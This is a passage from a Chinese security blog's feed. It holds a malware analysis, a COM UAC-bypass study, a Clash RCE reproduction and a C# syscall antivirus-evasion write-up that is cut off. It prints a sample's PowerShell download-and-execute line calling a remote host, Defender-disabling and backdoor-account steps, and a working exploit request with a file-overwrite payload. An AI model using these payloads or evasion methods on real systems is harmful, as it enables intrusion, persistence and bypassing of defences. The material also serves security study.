Defender后缀加白:&quot;.bat&quot;,&quot;.ppam&quot;,&quot;.xls&quot;,&quot;.docx&quot;,&quot;.bat&quot;,&quot;.exe&quot;,&quot;.vbs&quot;,&quot;.js&quot;,路径加白:&quot;C:\&quot;,&quot;D:\&quot;,&quot;E:\&quot;,进程加白:&quot;explorer.exe&quot;,&quot;kernel32.dll&quot;,&quot;kernel32.dll&quot;,&quot;aspnet_compiler.exe&quot;,&quot;cvtres.exe&quot;,&quot;CasPol.exe&quot;,&quot;csc.exe&quot;,&quot;csc.exe&quot;,&quot;Msbuild.exe&quot;,&quot;ilasm.exe&quot;,&quot;InstallUtil.exe&quot;,&quot;jsc.exe&quot;,&quot;Calc.exe&quot;,&quot;powershell.exe&quot;,&quot;rundll32.exe&quot;,&quot;conhost.exe&quot;,&quot;Cscript.exe&quot;,&quot;mshta.exe&quot;,&quot;cmd.exe&quot;,&quot;DefenderisasuckingAntivirus&quot;,&quot;wscript.exe&quot; IP加白:&quot;127.0.0.1&quot;        -&gt; Defender IDS关闭        -&gt; Defender关闭        -&gt; UAC限制开启 New-Ipublicroperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force        -&gt; 停止WinDefend服务，取消WinDefend服务自启        -&gt; 创建用户System32 pwd:123添加到管理员,将创建的System32用户添加到&quot;Remote Desktop Users&quot;组        -&gt; 停止WinDefend服务，停止WdNisSvc服务，停止WdNisSvc服务，删除windefend服务        -&gt; 防火墙关闭    第三阶段:        -&gt; 三层hex解密js内容写入C:\ProgramData\MinMinons\miguan.js        -&gt; 计划任务运行miguan.js schtasks /create /sc MINUTE /mo 164 /tn miguaned /F /tr &quot;$helogamanunu C:\\ProgramData\\MinMinons\\miguan.js&quot;            -&gt; 5秒后计划执行powershell Schtasks.exe /create /sc minute /mo 120 /tn escansupdate /f /tr “wscript.exe //b //e:jscript c:\\programdata\\REDACTED\\windowsdefenderupdate.js”    powershell.exe    “c:\windows\system32\windowspowershell\v1.0\powershell.exe” -ep bypass -c (i’w’r(‘hxxps://powpowpowff.blogspot[.]com/atom.xml’) -useb) | .(‘{1}{0}’-f’ex’,’i’) | ping 127.0.0.1        -&gt; 将&quot;C:\\ProgramData\\MinMinons\&quot; 下所有文件复制到开机自启路径(Startup)        -&gt;删除C:\ProgramData\MinMinons\Candlegraphy.~___~        -&gt;删除C:\ProgramData\MinMinons\*.vbs        -&gt;删除C:\ProgramData\MinMinons\*.exe</code></pre><p>解密完这些混淆一共得到11个文件：<br><img src="https://i.miji.bid/2023/08/07/175cdd87acc81086917494a53043b979.png" alt=""></p><p>powershell主要关注的</p><pre><code>Function Bulega {    param($Bulegagone)    $Bulegagone =  -join ($Bulegagone -split &#39;(..)&#39; | ? { $_ } | % { [char][convert]::ToUInt32($_,16) })    return $Bulegagone}遍历混淆的十六进制编码进行解码.(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;gomaliker&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;gomaliker&#39;,&#39;EX&#39;)IEX</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;划水摆烂分析点东西&lt;/p&gt;
&lt;h2 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;headerlink&quot; title=&quot;</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://jiushill.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>关于COM口{A6BFEA43-501F-456F-A845-983D3AD7B8F0} BypassUAC研究</title>
    <link href="http://jiushill.github.io/posts/bf1048f6.html"/>
    <id>http://jiushill.github.io/posts/bf1048f6.html</id>
    <published>2023-07-19T16:11:12.000Z</published>
    <updated>2023-07-19T16:41:11.526Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天上线的机器，通过用DLL劫持和注册表进行BypassUac发现很不行。win10下的360可能不杀可能杀，注册表通过修改ShellCommand来实现ByPassUAC的操作。过于敏感，而DLL劫持BypassUAC用久后又会被杀。今天翻文章看到头像哥的COM口bypassuac。发现可行，稍微研究了一下</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.zcgonvh.com/post/Advanced_Windows_Task_Scheduler_Playbook-Part.2_from_COM_to_UAC_bypass_and_get_SYSTEM_dirtectly.html" target="_blank" rel="noopener">https://www.zcgonvh.com/post/Advanced_Windows_Task_Scheduler_Playbook-Part.2_from_COM_to_UAC_bypass_and_get_SYSTEM_dirtectly.html</a><br><a href="https://3gstudent.github.io/backup-3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Windows%E4%B8%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BD%BF%E7%94%A8/" target="_blank" rel="noopener">https://3gstudent.github.io/backup-3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Windows%E4%B8%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BD%BF%E7%94%A8/</a><br><a href="https://3gstudent.github.io/%E9%80%9A%E8%BF%87COM%E7%BB%84%E4%BB%B6NetFwPolicy2%E8%B6%8A%E6%9D%83%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99" target="_blank" rel="noopener">https://3gstudent.github.io/%E9%80%9A%E8%BF%87COM%E7%BB%84%E4%BB%B6NetFwPolicy2%E8%B6%8A%E6%9D%83%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99</a><br><a href="https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-dllgetclassobject" target="_blank" rel="noopener">https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-dllgetclassobject</a><br><a href="http://www.cppblog.com/Streamlet/archive/2012/09/07/189762.html" target="_blank" rel="noopener">http://www.cppblog.com/Streamlet/archive/2012/09/07/189762.html</a></p><p>Github Link:<a href="https://github.com/zcgonvh/TaskSchedulerMisc/blob/master/schuac.cs" target="_blank" rel="noopener">https://github.com/zcgonvh/TaskSchedulerMisc/blob/master/schuac.cs</a></p><h2 id="模仿复刻"><a href="#模仿复刻" class="headerlink" title="模仿复刻"></a>模仿复刻</h2><p>COM Elevation Moniker的使用对COM组件有如下要求<br>该COM组件被注册<br>注册位置在HKEY_LOCAL_MACHINE下，也就是说，需要以管理员权限注册这个COM组件才可以<br>注册表HKEY_LOCAL_MACHINE\Software\Classes\CLSID下需要指定三项键值{CLSID}, LocalizedString(REG_EXPAND_SZ):displayName<br>{CLSID}/Elevation,IconReference(REG_EXPAND_SZ):applicationIcon<br>{CLSID}/Elevation,Enabled(REG_DWORD):1</p><p><img src="https://i.mji.rip/2023/07/20/2f8f90f89e145a96410d6da02f8440d4.png" alt=""></p><p>Elevation项 - Enabled判断是否启用<br>InProcServer32 - 一个 32 位进程内服务器并指定服务器可以运行的单元的线程模型<br>VirtualServerObjects - 辅助对象(在微软的文档里，我没找到描述这个的内容)-&gt;我理解为COM口CLSID有这个项的，理解为子COM口<br>ProgID - 系统服务名称<br>Programmable - 可编程的<br>TypeLib -<br>Version - 版本</p><p>通过查询：{A6BFEA43-501F-456F-A845-983D3AD7B8F0}可以得到如下</p><pre><code>PS C:\Users\Lenovo&gt; reg query &quot;HKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}&quot;HKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}    (默认)    REG_SZ    Virtual Factory for MaintenanceUI    AppId    REG_SZ    {A6BFEA43-501F-456F-A845-983D3AD7B8F0}    LocalizedString    REG_EXPAND_SZ    @%SystemRoot%\System32\MaintenanceUI.dll,-1HKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}\ElevationHKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}\InProcServer32HKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}\VirtualServerObjectsPS C:\Users\Lenovo&gt; reg query &quot;HKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}\VirtualServerObjects&quot;HKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}\VirtualServerObjects    {0f87369f-a4e5-4cfc-bd3e-73e6154572dd}    REG_SZPS C:\Users\Lenovo&gt; reg query &quot;HKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}\Elevation&quot;HKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}\Elevation    Enabled    REG_DWORD    0x1</code></pre><p>此时我们可以得到的信息有</p><pre><code>COM Name:Virtual Factory for MaintenanceUICOM GUID:{A6BFEA43-501F-456F-A845-983D3AD7B8F0}处理该COM的文件:@%SystemRoot%\System32\MaintenanceUI.dll子COM口:{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}COM口是否启用:0x1</code></pre><p>此时我们要研究的COM口的SID是：{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}，通过注册表查询并没有见到Elevation，意味着我们不能直接调用这个COM口<br><img src="https://i.mji.rip/2023/07/20/d1cfe236b65fd97466cf8ae38bbd3560.png" alt=""></p><p>powershell连接如下</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;A6BFEA43-501F-456F-A845-983D3AD7B8F0&quot;))$obj | get-member</code></pre><p><img src="https://i.mji.rip/2023/07/20/4fdac4737b3d74de8e90a9f563e88390.png" alt=""></p><p>而A6BFEA43-501F-456F-A845-983D3AD7B8F0<br><img src="https://i.mji.rip/2023/07/20/16f16207d2d8bbdafb20612351df42e3.png" alt=""></p><p>根据头像哥的文章进行复现<br><img src="https://i.mji.rip/2023/07/20/34a8ca57288ee45dede9a9ed28557506.png" alt=""><br><a href="https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-dllgetclassobject" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-dllgetclassobject</a></p><p><img src="https://i.mji.rip/2023/07/20/af635fb22c981ac15e973d9484b14701.png" alt=""></p><blockquote><blockquote><p>调用operator new分配足够的空间，并调用相关对象的构造函数<br>调用CClassFactory工厂类<br><img src="https://i.mji.rip/2023/07/20/89c0f2cb29945caba36275b581155eea.png" alt=""></p></blockquote></blockquote><p>大概是<classname>::CreateInstance<br><img src="https://i.mji.rip/2023/07/20/1b21f45d8ae299a5fc3a8a5a72c7ca37.png" alt=""></classname></p><p>CClassFactory::CreateInstance</p><blockquote><blockquote><p>上面的两个if判断相加后是否等于对应的GUID<br>如果两个都不是则去到30行</p><pre><code>*a4 = 0i64;  v4 = (const struct _GUID *)((char *)this + 8);  v5 = a4;  v6 = a3;  if ( *(_OWORD *)((char *)this + 8) == *(_OWORD *)&amp;CLSID_MultiObjectElevationFactory ) //-&gt; CLSID:36F0BD14-0D84D-468C-0B79C99900F30FA897F  {    if ( WPP_GLOBAL_Control != &amp;WPP_GLOBAL_Control &amp;&amp; *((_BYTE *)WPP_GLOBAL_Control + 28) &amp; 8 )      WPP_SF_(*((_QWORD *)WPP_GLOBAL_Control + 2), 12i64, &amp;WPP_8681af7930fc3f9ff14ce17035134427_Traceguids);    v7 = CElevatedFactoryClient::CreateInstance(v6, v5);LABEL_16:    v9 = v7;    goto LABEL_21;  }  if ( *(_OWORD *)((char *)this + 8) == *(_OWORD *)&amp;CLSID_ElevatedFactoryServerManager ) -&gt; CLSID:0E755468C-2F5-4D96-84873B0E68F0FE633A  {    if ( WPP_GLOBAL_Control != &amp;WPP_GLOBAL_Control &amp;&amp; *((_BYTE *)WPP_GLOBAL_Control + 28) &amp; 8 )      WPP_SF_(*((_QWORD *)WPP_GLOBAL_Control + 2), 13i64, &amp;WPP_8681af7930fc3f9ff14ce17035134427_Traceguids);    v7 = CElevatedFactoryServerManager::GetSingleton(v6, v5);    goto LABEL_16;  }</code></pre><p><img src="https://i.mji.rip/2023/07/20/191d26674f75d5c0b6bf69beab429e62.png" alt=""></p></blockquote></blockquote><pre><code> v8 = _IsValidVirtualFactory(v4);  v9 = v8;  if ( !v8 )  {    if ( WPP_GLOBAL_Control != &amp;WPP_GLOBAL_Control &amp;&amp; *((_BYTE *)WPP_GLOBAL_Control + 28) &amp; 8 )      WPP_SF_(*((_QWORD *)WPP_GLOBAL_Control + 2), 14i64, &amp;WPP_8681af7930fc3f9ff14ce17035134427_Traceguids);    v7 = CElevatedFactoryServer::CreateInstance(v4, v6, v5);    goto LABEL_16;  }</code></pre><p>CElevatedFactoryServer::CreateInstance<br>返回CElevatedFactoryServer实例<br><img src="https://i.mji.rip/2023/07/20/7985dedcdce8a1622f98caeace052363.png" alt=""></p><p>通过查看发现只有一个接口<br><img src="https://i.mji.rip/2023/07/20/be79ea64bcbe53da78f6ac9e19a74452.png" alt=""></p><p><img src="https://i.mji.rip/2023/07/20/f326d67fa1d6b93fe63b8a15d4a0a60b.png" alt=""><br><img src="https://i.mji.rip/2023/07/20/158c842f4afa343a5481543fb375ae9e.png" alt=""></p><p>创建并默认初始化与指定 CLSID 关联的类的单个对象。当您只想在本地系统上创建一个对象时，请调用CoCreateInstance 。要在远程系统上创建单个对象，请调用CoCreateInstanceEx函数。要基于单个 CLSID 创建多个对象，请调用CoGetClassObject函数。</p><pre><code>HRESULT CoCreateInstance(  [in]  REFCLSID  rclsid,  [in]  LPUNKNOWN pUnkOuter,  [in]  DWORD     dwClsContext,  [in]  REFIID    riid,  [out] LPVOID    *ppv);</code></pre><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance" target="_blank" rel="noopener">https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance</a></p><p>获取接口类对应的CLSID<br><img src="https://i.mji.rip/2023/07/20/5b4d53e013902bd5cb53837a119d52bc.png" alt=""></p><p>（每个接口类都有一个CLSID）<br><img src="https://i.mji.rip/2023/07/20/048d494642d0e09cb9e6dc15d61adfda.png" alt=""></p><p>回到开头判断CLSID那个地方跟踪上一个CLSID即可发现（赌- -）<br><img src="https://i.mji.rip/2023/07/20/274f84dc1645c3195de180b42b39a571.png" alt=""><br><img src="https://i.mji.rip/2023/07/20/55f8cec44b7402200163657ba11b169e.png" alt=""></p><p>正确寻找该CLSID的方法应该是定位到对应工厂类的QueryInterface函数调用该变量<br><img src="https://i.mji.rip/2023/07/20/68f991519dd65197b1a3cd6eaab79c7d.png" alt=""><br><img src="https://i.mji.rip/2023/07/20/7772186f5055cb4b3d1d4c375bd5cc00.png" alt=""></p><p>至此结论是：<br>由于CElevatedFactoryServer::ServerCreateElevatedObject首个参数可控，<strong>利用该参数可以创建任意注册路径表带有VirtualServerObjects项的CLSD对象</strong>。<br><img src="https://i.mji.rip/2023/07/20/4e68acbe7963870ed28574892364c6f9.png" alt=""></p><p>然后选择能利用的COM口，这里的0f87369f-a4e5-4cfc-bd3e-73e6154572dd就是用来操控计划任务的。然后只需要找到对应调用的接口类，声明对应的接口类并调用其中类的里的某个函数。<br>例如代码里的：ITaskService<br><img src="https://i.mji.rip/2023/07/20/35a2775fc88b595ab0f5960cd7ab2e3c.png" alt=""><br><img src="https://i.mji.rip/2023/07/20/cbfc21344f4f876c979a355c86b480ba.png" alt=""></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>其他知识点（抄自头像哥）</p><pre><code>我们知道经过UAC提升的COM对象需要使用`CoGetObject`函数，结合`Elevation Moniker`进行激活，这个行为记录在https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker。参考文章代码，我们注意到在微软的示例中采用`CLSCTX_LOCAL_SERVER`作为激活上下文标记，这表示要求DCOMLaunch创建一个新的进程外COM对象，`A6BFEA43-501F-456F-A845-983D3AD7B8F0`对象仅配置了`InProcServer32`，这将导致`代理激活（Surrogate Activation）`。关于代理激活有两个重要的点：首先从安全研究角度，配置了`APPID`的代理激活往往存在自定义权限检查。参考文档https://docs.microsoft.com/en-us/windows/win32/com/launchpermission与https://docs.microsoft.com/en-us/windows/win32/com/accesspermission，默认隐式权限检查由注册表项`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AppID\{APPID}@LaunchPermission`、`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AppID\{APPID}@AccessPermission`共同决定，其值为二进制格式表示的安全描述符`Security Descriptor(SD) binary form`。</code></pre><p><img src="https://i.mji.rip/2023/07/20/09c3c7b0820f8e63d91807dec6848145.png" alt=""></p><pre><code>$x=get-itemproperty &#39;hklm:\software\classes\appid\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}&#39;(new-object System.Security.AccessControl.RawSecurityDescriptor($x.LaunchPermission,0)).DiscretionaryAcl|fl(new-object System.Security.AccessControl.RawSecurityDescriptor($x.AccessPermission,0)).DiscretionaryAcl|fl</code></pre><p><img src="https://i.mji.rip/2023/07/20/9dbb2dd4577795e5eae1f48c56b4c670.png" alt=""></p><p>注意：该CLSID win7以上才有(Windows Server 2012开始有)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;今天上线的机器，通过用DLL劫持和注册表进行BypassUac发现很不行。win10下的360可能不杀可能杀，注册表通过修改ShellCom</summary>
      
    
    
    
    
    <category term="红队" scheme="http://jiushill.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>clash文件覆写导致RCE</title>
    <link href="http://jiushill.github.io/posts/d0a451b7.html"/>
    <id>http://jiushill.github.io/posts/d0a451b7.html</id>
    <published>2023-06-19T10:03:45.000Z</published>
    <updated>2023-06-21T03:21:04.006Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>影响版本：&lt;=0.19.8<br>复现环境：<br>windows+clash for windows+内核clash-windows-amd64-v1.15.0+未设置secret    </p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>默认先走授权，有secret无法利用<br>（2021年后默认随机UUID的secret，端口随机）<br><img src="https://s1.ax1x.com/2023/06/21/pCGekqS.png" alt=""><br><img src="https://s1.ax1x.com/2023/06/21/pCGeZ5j.png" alt=""></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>API请求包    </p><pre><code>PUT /configs?force=true HTTP/1.1Host: 127.0.0.1:9090Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 326{&quot;payload&quot;:&quot;mixed-port: 7890\nallow-lan: false\nmode: rule\nlog-level: warning\nproxy-providers:\n  provider1:\n    type: http\n    url: &#39;http://127.0.0.1:9999/evil.yaml&#39;\n    interval: 3600\n    path: ../../.zshenv\n    healthcheck:\n      enable: true\n      interval: 600\n      url: http://www.gstatic.com/generate_204&quot;}</code></pre><p>windows下的payload<br>vps开http.server<br>evil.yaml   </p><pre><code>calc.exe &amp;&amp; echo :proxies:  - {name: vP, server: n04.a00x.party, port: 18000, type: ssr, cipher: aes-256-cfb, password: AFX92CS, protocol: auth_aes128_sha1, obfs: http_simple, protocol-param: 232991:xSnSFv, obfs-param: download.windowsupdate.com, udp: true}#&gt;</code></pre><p>通过利用powershell自定义.profile来执行命令。当用户打开powershell将触发<br>（还需要powershell运行脚本执行才能成功）    </p><pre><code>1、%windir%\system32\WindowsPowerShell\v1.0\profile.ps1它作用于所有用户、所有的Shell。2、%windir%\system32\WindowsPowerShell\v1.0\ Microsoft.PowerShell_profile.ps1作用于所有用户，但只作用于Microsoft.PowerShell这个shell。这个我也没懂是什么意思，难道还有不是PowerShell的PowerShell shell？呃，有点像绕口令。3、%UserProfile%\My Documents\WindowsPowerShell\profile.ps1作用于当前用户的所有shell。4、%UserProfile%\My Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1作用于当前用户的Microsoft.PowerShell这个shell。</code></pre><p><img src="https://files.catbox.moe/t6x1gl.gif" alt=""></p><p>开机自启路径<br>（有杀毒纯纯白给）<br><img src="https://s1.ax1x.com/2023/06/21/pCGmCFJ.png" alt=""></p><h2 id="代码跟踪"><a href="#代码跟踪" class="headerlink" title="代码跟踪"></a>代码跟踪</h2><p>可以看到updateConfigs函数处理，只要json格式正确直接进行下一步<br><img src="https://s1.ax1x.com/2023/06/21/pCGmakQ.png" alt=""></p><p>最后解析json里的payload。获取路径，拼接路径，根据类型进行处理。最后调用NewProxySetProvider函数<br><img src="https://s1.ax1x.com/2023/06/21/pCGmwfs.png" alt=""></p><p><img src="https://s1.ax1x.com/2023/06/21/pCGmr60.png" alt=""><br><a href="https://github.com/Dreamacro/clash/blob/4d66da2277ddaf41f83bd889b064c0a584f7a8ad/adapter/provider/parser.go#L4" target="_blank" rel="noopener">https://github.com/Dreamacro/clash/blob/4d66da2277ddaf41f83bd889b064c0a584f7a8ad/adapter/provider/parser.go#L4</a>     </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>作者最早添加更新配置文件的API都加了安全验证<a href="https://github.com/Dreamacro/clash/commit/9cfd26d44062c8d0811395cf944024bb680705b5" target="_blank" rel="noopener">https://github.com/Dreamacro/clash/commit/9cfd26d44062c8d0811395cf944024bb680705b5</a><br>能被利用纯属自己不设置secret<br><a href="https://github.com/Dreamacro/clash/blob/9cfd26d44062c8d0811395cf944024bb680705b5/hub/route/server.go" target="_blank" rel="noopener">https://github.com/Dreamacro/clash/blob/9cfd26d44062c8d0811395cf944024bb680705b5/hub/route/server.go</a><br><img src="https://s1.ax1x.com/2023/06/21/pCGmfh9.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://0xf4n9x.github.io/2022/10/20/clash-unauth-force-configs-csrf-rce/" target="_blank" rel="noopener">https://0xf4n9x.github.io/2022/10/20/clash-unauth-force-configs-csrf-rce/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h2&gt;&lt;p&gt;影响版本：&amp;lt;=0.19.8&lt;br&gt;复现环境：&lt;br&gt;windows+clash for windows+内核clash</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://jiushill.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>C# syscall免杀</title>
    <link href="http://jiushill.github.io/posts/78d2031e.html"/>
    <id>http://jiushill.github.io/posts/78d2031e.html</id>
    <published>2022-11-21T19:02:36.000Z</published>
    <updated>2022-11-21T19:39:10.621Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近打了两个项目，大多数笔记都更新在星球了。想起来，很久没写博客了，更新一下<br>最近研究了一下C#的syscall，记录一下<br><img src="https://s1.ax1x.com/2022/11/22/zlo3od.png" alt=""></p><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><blockquote><p>抄来的介绍</p></blockquote><p>在Windows中，进程架构分为两种处理器访问模式——用户模式和内核模式。这些模式的实现背后的想法是保护用户应用程序不访问和修改任何关键的操作系统数据。Chrome、Word 等用户应用程序都运行在用户模式下，而操作系统代码（如系统服务和设备驱动程序）都运行在内核模式下。<br><img src="https://s1.ax1x.com/2022/11/22/zloJJI.png" alt=""></p><p>内核模式特指处理器中的一种执行模式，它授予对所有系统内存和所有 CPU 指令的访问权限。一些 x86 和 x64处理器通过使用另一个称为环级别的术语来区分这些模式。利用环级别特权模式的处理器定义了四个特权级别 - 其他称为环- 以保护系统代码和数据。这些振铃级别的示例如下所示。<br><img src="https://s1.ax1x.com/2022/11/22/zloNSP.png" alt=""></p><p>在 Windows 中，Windows 仅使用其中两个环 - 内核模式的环 0 和用户模式的环 3。现在，在正常的处理器操作期间，处理器将根据处理器上运行的代码类型在这两种模式之间切换。那么，这种“环级”安全性背后的原因是什么？那么，当您启动用户模式应用程序时，Windows 将为该应用程序创建一个新进程，并为该应用程序提供一个私有虚拟地址空间和一个私有句柄表。 这个“句柄表”是一个包含句柄的内核对象。句柄只是对特定系统资源的抽象引用值，例如内存区域或位置、打开的文件或管道。它的最初目标是对 API 用户隐藏真实的内存地址，从而允许系统执行某些管理功能，例如重组物理内存。 总体而言，handles 作业是针对任务内部结构的，例如：令牌、进程、线程等。下面可以看到一个句柄的示例。<br><img src="https://s1.ax1x.com/2022/11/22/zloUQf.png" alt=""></p><p>因为应用程序的虚拟地址空间是私有的，所以一个应用程序不能更改属于另一个应用程序的数据——除非进程通过文件映射或通过VirtualProtect函数将其私有地址空间的一部分作为共享内存部分提供，或者除非一个进程有权打开另一个进程以使用跨进程内存功能，例如<strong>ReadProcessMemory</strong>和<strong>WriteProcessMemory</strong>。<br><img src="https://s1.ax1x.com/2022/11/22/zloay8.png" alt=""></p><p>现在，与用户模式不同，在内核模式下运行的所有代码共享一个称为系统空间的虚拟地址空间。这意味着内核模式驱动程序不与其他驱动程序和操作系统本身隔离。因此，如果驱动程序不小心写入了错误的地址空间或进行了恶意操作，那么它可能会危及系统或其他驱动程序。尽管有一些保护措施可以防止操作系统受到干扰——比如内核补丁保护又名补丁保护，但我们不必担心这些。【由于内核容纳了操作系统的大部分内部数据结构（例如句柄表），任何时候用户模式应用程序需要访问这些数据结构或需要调用内部 Windows 例程来执行特权操作（例如读取一个文件），那么它必须首先<strong>从用户模式切换到内核模式。这就是系统调用发挥作用的地方</strong>。 为了让用户应用程序在内核模式下访问这些数据结构，该进程使用了一个特殊的处理器指令触发器，称为“系统调用”。该指令触发处理器访问模式之间的转换，并允许处理器访问内核中的系统服务调度代码。】这反过来调用Ntoskrnl.exe或Win32k.sys中的适当内部函数，这些函数包含内核和 OS 应用程序级逻辑。</p><p>问题：<br>1.不同的系统的syscall不一样，怎么样才能实现在不同系统里面动态调用</p><h2 id="如何获取syscall的系统调用号"><a href="#如何获取syscall的系统调用号" class="headerlink" title="如何获取syscall的系统调用号"></a>如何获取syscall的系统调用号</h2><p>准备工具：windbg<br>获取API地址</p><pre><code>x ntdll!NtCreateFile</code></pre><p>指定地址查看反汇编</p><pre><code>u 00007ffd`3826db50</code></pre><p><img src="https://s1.ax1x.com/2022/11/22/zlo0eg.png" alt=""></p><p>得到的汇编</p><pre><code>ntdll!ZwCreateFile:00007ffd`3826db50 4c8bd1          mov     r10,rcx00007ffd`3826db53 b855000000      mov     eax,55h00007ffd`3826db58 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],100007ffd`3826db60 7503            jne     ntdll!ZwCreateFile+0x15 (00007ffd`3826db65)00007ffd`3826db62 0f05            syscall00007ffd`3826db64 c3              ret00007ffd`3826db65 cd2e            int     2Eh00007ffd`3826db67 c3              ret</code></pre><p>其中这里的<strong>mov eax,55h</strong>就是系统调用号，这里的NtCreateFile的系统调用号就是<strong>0x55</strong>。将系统调用号传入eax寄存器，将调用系统调用指令。CPU 将在此处跳转到内核模式并执行指定的特权操作。<br>这里可以看到关键的汇编指令：<br>(参数会传到r10，r10在传给rcx)</p><pre><code>mov r10,rcx //规定mov eax,&lt;系统调用号&gt;syscallret</code></pre><p>获取API函数需要的内存权限</p><pre><code>!address 00007ffd`3826db50</code></pre><p><img src="https://s1.ax1x.com/2022/11/22/zloBwQ.png" alt=""></p><h2 id="C-下如何编写"><a href="#C-下如何编写" class="headerlink" title="C#下如何编写"></a>C#下如何编写</h2><p>代码示例来源：<a href="https://github.com/SolomonSklash/SyscallPOC/tree/master/Syscall" target="_blank" rel="noopener">https://github.com/SolomonSklash/SyscallPOC/tree/master/Syscall</a></p><p>整体代码思路：<br>-&gt;先把提取出来的系统编号那段汇编放到byte[]数组<br>-&gt;定义一个函数实现委托<br>-&gt;定义byte指针，将汇编的byte[]数组赋予该指针<br>-&gt;定义名为memoryAddress的int变量，将byte指针赋予<br>-&gt;利用VirtualProtectEx修改内存权限<br>-&gt;利用Marshal.GetDelegateForFunctionPointer将函数转换为一个委托<br>-&gt;返回该委托</p><p>问题：<br>为什么要用unsafe<br>为什么要用Marshal.GetDelegateForFunctionPointer<br>为什么有UnmanagedFunctionPointer(CallingConvention.StdCall)</p><p>为什么要用unsafe</p><pre><code>当一个代码块使用 unsafe 修饰符标记时，C# 允许在函数中使用指针变量。不安全代码或非托管代码是指使用了指针变量的代码块</code></pre><p>为什么要有Marshal.GetDelegateForFunctionPointer</p><pre><code>在.net 2.0 中，框架直接提供了 Marshal.GetDelegateForFunctionPointer 来转换一个函数指针为一个委托C# 中的委托（Delegate）类似于 C 或 C++ 中函数的指针。委托（Delegate） 